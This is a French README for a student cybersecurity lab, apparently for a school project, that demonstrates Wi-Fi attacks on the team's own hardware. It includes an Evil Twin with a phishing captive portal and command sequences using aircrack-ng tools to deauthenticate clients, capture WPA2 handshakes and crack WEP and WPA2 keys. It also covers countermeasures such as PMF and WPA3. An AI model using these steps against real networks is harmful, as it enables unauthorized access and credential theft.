# 📡 Wi-Fi Attack Lab — Projet Cybersécurité

> **⚠️ Cadre éducatif exclusivement.** Toutes les démonstrations sont réalisées sur du matériel appartenant à l'équipe projet. Aucune attaque sur un réseau tiers.

Équipe : **Théophile PASSET · Jade DEFILHES · Sarah KRIVINE · Yoann CHALIGNE**  
École : Projet cybersécurité — 2025/2026

---

## 🎯 Description

Ce projet implémente deux modules de démonstration de sécurité Wi-Fi :

- **Module 1 — Evil Twin** : Clone un réseau Wi-Fi légitime, force la déconnexion des victimes (deauth 802.11), intercepte les credentials via un portail captif de phishing.
- **Module 2 — Évolution des protocoles** : Démonstration comparative WEP → WPA → WPA2 → WPA3, avec attaque sur chaque protocole.

---

## 🖥️ Architecture matérielle

```
Pi A (kali-raspberrypi-A) — IP: 192.168.1.15
├── Rôle : Attaquant
├── wlan0 : puce intégrée
├── wlan1 : Clé ALFA RTL8192EU (mode moniteur + injection)
├── ESP8266 Deauther (firmware Spacehuhn 2.6.1)
└── Captive portal : pi_a/captive_portal/

Pi B (kali-raspberrypi-B) — IP: 192.168.1.44
├── Rôle : AP cible (réseau légitime ou lab)
├── wlan0 : puce intégrée brcmfmac
└── Scripts : pi_b/switch.sh
```

---

## 📁 Structure du repo

```
wifi_attack_lab/
├── pi_a/
│   ├── attack_wep.sh          # Attaque WEP (aircrack-ng)
│   ├── attack_wpa2.sh         # Attaque WPA2 (deauth + handshake)
│   ├── start_evil_twin.sh     # Evil Twin complet
│   └── captive_portal/
│       ├── server.py          # Serveur HTTP (portail captif)
│       ├── index.html         # Page de login Mcdo
│       ├── success.html       # Page après soumission
│       └── dashboard.html     # Dashboard SOC temps réel
│
├── pi_b/
│   ├── switch.sh              # Script principal (switch entre modes)
│   ├── start_mcdo_piB.sh      # Réseau légitime "Mcdo Free Wifi"
│   └── configs/
│       ├── hostapd_wep.conf       # WEP (1997) — VULNÉRABLE
│       ├── hostapd_wpa1.conf      # WPA1-TKIP (2003) — VULNÉRABLE
│       ├── hostapd_wpa2.conf      # WPA2 sans PMF — VULNÉRABLE
│       ├── hostapd_wpa2_pmf1.conf # WPA2 + PMF optionnel
│       ├── hostapd_wpa2_pmf2.conf # WPA2 + PMF obligatoire
│       └── hostapd_wpa3.conf      # WPA3-SAE (2018) — PROTÉGÉ
│
└── docs/
    └── rapport_technique.md   # Documentation complète
```

---

## 🚀 Utilisation rapide

### Pi B — Changer de mode
```bash
chmod +x switch.sh
./switch.sh wep      # WEP vulnérable
./switch.sh wpa2     # WPA2 vulnérable
./switch.sh wpa3     # WPA3 protégé
./switch.sh stop     # Arrêter
```

### Pi A — Attaque WEP
```bash
# Terminal 1 : capture
sudo airodump-ng -c 6 --bssid <BSSID> -w /tmp/wep wlan1

# Terminal 2 : injection ARP
sudo aireplay-ng --arpreplay -b <BSSID> -h <CLIENT_MAC> wlan1

# Terminal 3 : crack
sudo aircrack-ng /tmp/wep-01.cap
# → KEY FOUND! [ AA:BB:CC:DD:EE ]
```

### Pi A — Attaque WPA2
```bash
# Terminal 1 : capture
sudo airodump-ng -c 6 --bssid <BSSID> -w /tmp/wpa2 wlan1

# Terminal 2 : deauth → handshake
sudo aireplay-ng --deauth 5 -a <BSSID> -c <CLIENT_MAC> wlan1
# → "WPA handshake: B8:27:EB:3D:2F:FA" (Terminal 1)

# Crack
sudo aircrack-ng -w /tmp/wordlist.txt /tmp/wpa2-01.cap
# → KEY FOUND! [ password123 ]
```

---

## 📊 Tableau comparatif

| Protocole | Année | Crack offline ? | Deauth possible ? | Résultat démo |
|-----------|-------|-----------------|-------------------|---------------|
| WEP | 1997 | ✅ ~3 min | ✅ Oui | KEY FOUND! |
| WPA1-TKIP | 2003 | ✅ Dico | ✅ Oui | Masqué iOS/Android |
| WPA2 sans PMF | 2004 | ✅ Dico | ✅ Oui | KEY FOUND! |
| WPA2 + PMF | 2009 | ✅ Dico | ❌ Non | Deauth bloqué |
| WPA3-SAE | 2018 | ❌ Non | ❌ Non | Limite driver Pi |

---

## 🛡️ Contre-mesures

- **PMF (ieee80211w=2)** : rend le deauth impossible
- **WPA3-SAE** : Forward Secrecy, résistance aux attaques dico
- **VPN** : chiffrement de bout en bout même sur réseau compromis
- **Vérifier le certificat** : HTTPS avec certificat valide
- **Ne jamais utiliser les réseaux Wi-Fi ouverts** pour des données sensibles

---

## ⚖️ Cadre légal

Ce projet est réalisé dans un cadre éducatif strictement contrôlé.  
Toute reproduction hors cadre autorisé constitue une infraction pénale (Art. 323-1 Code pénal).
